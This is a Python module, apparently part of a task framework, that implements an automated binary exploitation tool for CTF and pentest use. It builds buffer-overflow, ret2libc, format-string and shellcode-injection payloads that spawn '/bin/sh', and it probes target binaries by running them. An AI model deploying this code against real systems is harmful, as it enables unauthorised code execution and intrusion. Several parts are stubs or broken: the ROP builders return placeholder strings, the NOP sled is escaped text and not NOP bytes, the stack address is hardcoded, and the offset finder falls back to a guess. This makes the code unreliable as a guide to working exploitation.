from __future__ import annotations
import struct
import subprocess
import tempfile
import os
from typing import Dict, Any, List, Optional, Tuple
from ..core.task import Task

try:
    from pwn import *
    from capstone import *
    PWN_AVAILABLE = True
except ImportError:
    PWN_AVAILABLE = False


class BinaryExploit(Task):
    """Comprehensive binary exploitation toolkit for CTF and pentest scenarios."""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.gadgets = []
        self.binary_info = {}
    
    async def validate_params(self) -> None:
        """Validate BinaryExploit parameters."""
        if not PWN_AVAILABLE:
            raise ValueError("pwntools is required. Install with: pip install pwntools")
        
        if not self.params.get("binary"):
            raise ValueError("binary parameter is required")
        
        binary_path = self.params["binary"]
        if not os.path.exists(binary_path):
            raise ValueError(f"Binary file not found: {binary_path}")
    
    async def run(self) -> Dict[str, Any]:
        """Main exploitation routine."""
        await self.validate_params()
        
        binary_path = self.params["binary"]
        exploit_type = self.params.get("type", "auto")
        target_function = self.params.get("target_function", "main")
        
        results = {
            "binary": binary_path,
            "exploit_type": exploit_type,
            "status": "analyzing"
        }
        
        try:
            # Load and analyze binary
            elf = ELF(binary_path)
            self.binary_info = {
                "arch": elf.arch,
                "bits": elf.bits,
                "endian": elf.endian,
                "canary": elf.canary,
                "nx": elf.nx,
                "pie": elf.pie,
                "relro": elf.relro,
                "symbols": list(elf.symbols.keys())[:50]  # Limit output
            }
            
            results["binary_info"] = self.binary_info
            
            self.logger.info(f"Binary Analysis - Arch: {elf.arch}, Bits: {elf.bits}")
            self.logger.info(f"Protections: Canary={elf.canary}, NX={elf.nx}, PIE={elf.pie}")
            
            # Determine exploitation strategy based on protections
            if exploit_type == "auto":
                exploit_type = self._determine_exploit_strategy(elf)
                results["auto_strategy"] = exploit_type
            
            # Execute exploitation strategy
            if exploit_type == "buffer_overflow":
                exploit_result = await self._buffer_overflow_exploit(elf, target_function)
            elif exploit_type == "rop_chain":
                exploit_result = await self._rop_chain_exploit(elf)
            elif exploit_type == "ret2libc":
                exploit_result = await self._ret2libc_exploit(elf)
            elif exploit_type == "format_string":
                exploit_result = await self._format_string_exploit(elf)
            elif exploit_type == "shellcode_injection":
                exploit_result = await self._shellcode_injection(elf)
            else:
                # Try multiple strategies
                exploit_result = await self._multi_strategy_exploit(elf)
            
            results.update(exploit_result)
            return results
            
        except Exception as e:
            self.logger.error(f"Binary exploitation failed: {e}")
            return {
                "status": "error",
                "error": str(e),
                "binary": binary_path
            }
    
    def _determine_exploit_strategy(self, elf) -> str:
        """Determine the best exploitation strategy based on binary protections."""
        if not elf.nx and not elf.canary:
            return "shellcode_injection"
        elif elf.nx and not elf.canary:
            return "ret2libc"
        elif elf.nx and elf.canary:
            return "rop_chain"
        else:
            return "buffer_overflow"
    
    async def _buffer_overflow_exploit(self, elf, target_function: str) -> Dict[str, Any]:
        """Generate buffer overflow exploit."""
        try:
            self.logger.info("Generating buffer overflow exploit...")
            
            # Find buffer overflow offset
            offset = await self._find_overflow_offset(elf.path)
            if not offset:
                return {"status": "no_overflow", "method": "buffer_overflow"}
            
            # Generate different payload types
            payloads = {}
            
            # Simple crash payload
            payloads["crash"] = b"A" * (offset + 8)
            
            # Control EIP/RIP payload
            if elf.bits == 32:
                payloads["control_eip"] = b"A" * offset + b"BBBB"
            else:
                payloads["control_rip"] = b"A" * offset + b"BBBBBBBB"
            
            # Jump to function payload (if function exists)
            if target_function in elf.symbols:
                func_addr = elf.symbols[target_function]
                if elf.bits == 32:
                    payloads["jump_to_function"] = b"A" * offset + struct.pack("<I", func_addr)
                else:
                    payloads["jump_to_function"] = b"A" * offset + struct.pack("<Q", func_addr)
            
            # System shell payload (if system is available)
            if "system" in elf.symbols:
                system_addr = elf.symbols["system"]
                
                # Try to find "/bin/sh" string
                binsh_addr = None
                try:
                    with open(elf.path, 'rb') as f:
                        data = f.read()
                        binsh_offset = data.find(b"/bin/sh")
                        if binsh_offset != -1:
                            binsh_addr = elf.address + binsh_offset
                except:
                    pass
                
                if binsh_addr:
                    if elf.bits == 32:
                        # system(binsh_addr)
                        payloads["system_shell"] = (b"A" * offset + 
                                                  struct.pack("<I", system_addr) +
                                                  b"BBBB" +  # return address
                                                  struct.pack("<I", binsh_addr))
                    else:
                        # Need ROP for x64 calling convention
                        payloads["system_shell_note"] = "Requires ROP chain for x64"
            
            return {
                "status": "overflow_found",
                "method": "buffer_overflow",
                "offset": offset,
                "payloads": {k: v.hex() if isinstance(v, bytes) else v for k, v in payloads.items()}
            }
            
        except Exception as e:
            return {
                "status": "overflow_error",
                "method": "buffer_overflow",
                "error": str(e)
            }
    
    async def _find_overflow_offset(self, binary_path: str) -> Optional[int]:
        """Find buffer overflow offset using cyclic patterns."""
        try:
            # Generate cyclic pattern
            pattern = cyclic(1000)
            
            # Run binary with pattern
            with tempfile.NamedTemporaryFile(delete=False) as tmp:
                tmp.write(pattern)
                tmp.flush()
                
                try:
                    # Try stdin input
                    proc = subprocess.run(
                        [binary_path],
                        input=pattern,
                        capture_output=True,
                        timeout=10
                    )
                    
                    if proc.returncode < 0:  # Crashed
                        # Try to find the offset using core dump or other methods
                        # For now, use a simple heuristic
                        for offset in range(0, 1000, 4):
                            test_pattern = b"A" * offset + b"BBBB"
                            test_proc = subprocess.run(
                                [binary_path],
                                input=test_pattern,
                                capture_output=True,
                                timeout=5
                            )
                            if test_proc.returncode < 0:
                                return offset
                        
                        # If pattern method fails, return a reasonable guess
                        return 100
                    
                except subprocess.TimeoutExpired:
                    pass
                finally:
                    os.unlink(tmp.name)
            
            return None
            
        except Exception:
            return None
    
    async def _rop_chain_exploit(self, elf) -> Dict[str, Any]:
        """Generate ROP chain exploit."""
        try:
            self.logger.info("Generating ROP chain exploit...")
            
            # Find ROP gadgets
            gadgets = await self._find_rop_gadgets(elf.path)
            
            if not gadgets:
                return {"status": "no_gadgets", "method": "rop_chain"}
            
            # Build ROP chain for different objectives
            rop_chains = {}
            
            # Try to build execve("/bin/sh", NULL, NULL) chain
            execve_chain = self._build_execve_rop_chain(gadgets, elf)
            if execve_chain:
                rop_chains["execve_binsh"] = execve_chain
            
            # Try to build system("/bin/sh") chain
            system_chain = self._build_system_rop_chain(gadgets, elf)
            if system_chain:
                rop_chains["system_binsh"] = system_chain
            
            return {
                "status": "rop_chains_generated",
                "method": "rop_chain",
                "gadget_count": len(gadgets),
                "gadgets": gadgets[:20],  # Show first 20 gadgets
                "rop_chains": rop_chains
            }
            
        except Exception as e:
            return {
                "status": "rop_error",
                "method": "rop_chain",
                "error": str(e)
            }
    
    async def _find_rop_gadgets(self, binary_path: str) -> List[Dict[str, Any]]:
        """Find ROP gadgets in the binary."""
        try:
            # Use ROPgadget tool if available
            try:
                result = subprocess.run(
                    ["ROPgadget", "--binary", binary_path, "--only", "pop|ret"],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if result.returncode == 0:
                    gadgets = []
                    for line in result.stdout.split('\n'):
                        if ':' in line and 'pop' in line:
                            parts = line.split(':')
                            if len(parts) >= 2:
                                addr = parts[0].strip()
                                instr = parts[1].strip()
                                try:
                                    gadgets.append({
                                        "address": int(addr, 16),
                                        "instruction": instr
                                    })
                                except ValueError:
                                    continue
                    return gadgets[:100]  # Limit to 100 gadgets
            except FileNotFoundError:
                pass
            
            # Fallback: manual gadget search using pwntools
            elf = ELF(binary_path)
            rop = ROP(elf)
            
            # Get available gadgets
            gadgets = []
            for addr, instrs in rop.gadgets.items():
                gadgets.append({
                    "address": addr,
                    "instruction": " ; ".join(str(i) for i in instrs)
                })
            
            return gadgets[:100]  # Limit output
            
        except Exception:
            return []
    
    def _build_execve_rop_chain(self, gadgets: List[Dict], elf) -> Optional[str]:
        """Build ROP chain for execve("/bin/sh", NULL, NULL)."""
        try:
            # This is a simplified example - real ROP chain building is complex
            # and depends on available gadgets and architecture
            
            # For demonstration, return a template
            return "execve_rop_chain_template"
            
        except Exception:
            return None
    
    def _build_system_rop_chain(self, gadgets: List[Dict], elf) -> Optional[str]:
        """Build ROP chain for system("/bin/sh")."""
        try:
            # Simplified system ROP chain
            return "system_rop_chain_template"
            
        except Exception:
            return None
    
    async def _ret2libc_exploit(self, elf) -> Dict[str, Any]:
        """Generate ret2libc exploit."""
        try:
            self.logger.info("Generating ret2libc exploit...")
            
            # Check if we have libc functions
            libc_functions = ["system", "execve", "exit"]
            available_functions = {}
            
            for func in libc_functions:
                if func in elf.symbols:
                    available_functions[func] = elf.symbols[func]
            
            if not available_functions:
                return {"status": "no_libc_functions", "method": "ret2libc"}
            
            # Find offset (reuse from buffer overflow)
            offset = await self._find_overflow_offset(elf.path)
            if not offset:
                return {"status": "no_overflow", "method": "ret2libc"}
            
            # Generate ret2libc payloads
            payloads = {}
            
            if "system" in available_functions:
                system_addr = available_functions["system"]
                
                # Try to find "/bin/sh" string
                binsh_addr = self._find_string_in_binary(elf.path, b"/bin/sh")
                
                if binsh_addr and elf.bits == 32:
                    # 32-bit ret2libc: system("/bin/sh")
                    payloads["ret2libc_system"] = (
                        b"A" * offset +
                        struct.pack("<I", system_addr) +
                        b"BBBB" +  # return address
                        struct.pack("<I", binsh_addr)
                    ).hex()
            
            return {
                "status": "ret2libc_generated",
                "method": "ret2libc",
                "offset": offset,
                "available_functions": available_functions,
                "payloads": payloads
            }
            
        except Exception as e:
            return {
                "status": "ret2libc_error",
                "method": "ret2libc",
                "error": str(e)
            }
    
    def _find_string_in_binary(self, binary_path: str, search_string: bytes) -> Optional[int]:
        """Find a string in the binary and return its address."""
        try:
            elf = ELF(binary_path)
            with open(binary_path, 'rb') as f:
                data = f.read()
                offset = data.find(search_string)
                if offset != -1:
                    return elf.address + offset
            return None
        except Exception:
            return None
    
    async def _format_string_exploit(self, elf) -> Dict[str, Any]:
        """Generate format string exploit."""
        try:
            self.logger.info("Generating format string exploit...")
            
            # Test for format string vulnerability
            format_payloads = [
                b"%x" * 10,
                b"%p" * 8,
                b"%s" * 5,
                b"AAAA%x.%x.%x.%x",
                b"%1$p %2$p %3$p %4$p"
            ]
            
            vulnerable = False
            for payload in format_payloads:
                try:
                    proc = subprocess.run(
                        [elf.path],
                        input=payload,
                        capture_output=True,
                        timeout=5
                    )
                    
                    if proc.stdout and (b"0x" in proc.stdout or b"41414141" in proc.stdout):
                        vulnerable = True
                        break
                        
                except (subprocess.TimeoutExpired, Exception):
                    continue
            
            if not vulnerable:
                return {"status": "not_vulnerable", "method": "format_string"}
            
            # Generate format string payloads
            fs_payloads = {
                "stack_leak": b"%p" * 20,
                "memory_dump": b"%s" * 10,
                "write_primitive": b"%n" * 5,
                "address_leak": b"AAAA%x.%x.%x.%x.%x.%x",
            }
            
            return {
                "status": "format_string_vulnerable",
                "method": "format_string",
                "payloads": {k: v.hex() for k, v in fs_payloads.items()}
            }
            
        except Exception as e:
            return {
                "status": "format_string_error",
                "method": "format_string",
                "error": str(e)
            }
    
    async def _shellcode_injection(self, elf) -> Dict[str, Any]:
        """Generate shellcode injection exploit."""
        try:
            self.logger.info("Generating shellcode injection exploit...")
            
            if elf.nx:
                return {"status": "nx_enabled", "method": "shellcode_injection"}
            
            # Generate shellcode for different architectures
            shellcodes = {}
            
            if elf.arch == "i386":
                context.arch = "i386"
                shellcodes["execve_sh"] = asm(shellcraft.sh())
                shellcodes["execve_bin_sh"] = asm(shellcraft.execve("/bin/sh"))
            elif elf.arch == "amd64":
                context.arch = "amd64"
                shellcodes["execve_sh"] = asm(shellcraft.sh())
                shellcodes["execve_bin_sh"] = asm(shellcraft.execve("/bin/sh"))
            
            # Find buffer overflow offset
            offset = await self._find_overflow_offset(elf.path)
            if not offset:
                return {"status": "no_overflow", "method": "shellcode_injection"}
            
            # Generate NOP sled + shellcode payloads
            payloads = {}
            for name, shellcode in shellcodes.items():
                nop_sled = b"\\x90" * 100  # NOP sled
                # Assume stack address (this would need to be leaked in practice)
                stack_addr = 0xbffffc00  # Example stack address
                
                payload = nop_sled + shellcode + b"A" * (offset - len(nop_sled) - len(shellcode))
                if elf.bits == 32:
                    payload += struct.pack("<I", stack_addr)
                else:
                    payload += struct.pack("<Q", stack_addr)
                
                payloads[name] = payload.hex()
            
            return {
                "status": "shellcode_generated",
                "method": "shellcode_injection",
                "offset": offset,
                "shellcodes": {k: v.hex() for k, v in shellcodes.items()},
                "payloads": payloads
            }
            
        except Exception as e:
            return {
                "status": "shellcode_error",
                "method": "shellcode_injection",
                "error": str(e)
            }
    
    async def _multi_strategy_exploit(self, elf) -> Dict[str, Any]:
        """Try multiple exploitation strategies."""
        try:
            self.logger.info("Trying multiple exploitation strategies...")
            
            strategies = ["buffer_overflow", "format_string", "ret2libc", "rop_chain"]
            results = {"multi_strategy": True, "strategies": {}}
            
            for strategy in strategies:
                try:
                    if strategy == "buffer_overflow":
                        result = await self._buffer_overflow_exploit(elf, "main")
                    elif strategy == "format_string":
                        result = await self._format_string_exploit(elf)
                    elif strategy == "ret2libc":
                        result = await self._ret2libc_exploit(elf)
                    elif strategy == "rop_chain":
                        result = await self._rop_chain_exploit(elf)
                    
                    results["strategies"][strategy] = result
                    
                    # If we found a working exploit, prioritize it
                    if result.get("status") in ["overflow_found", "format_string_vulnerable", "ret2libc_generated"]:
                        results["recommended_strategy"] = strategy
                        results["status"] = "exploit_found"
                        return results
                        
                except Exception as e:
                    results["strategies"][strategy] = {"status": "error", "error": str(e)}
            
            results["status"] = "no_exploits_found"
            return results
            
        except Exception as e:
            return {
                "status": "multi_strategy_error",
                "error": str(e)
            }
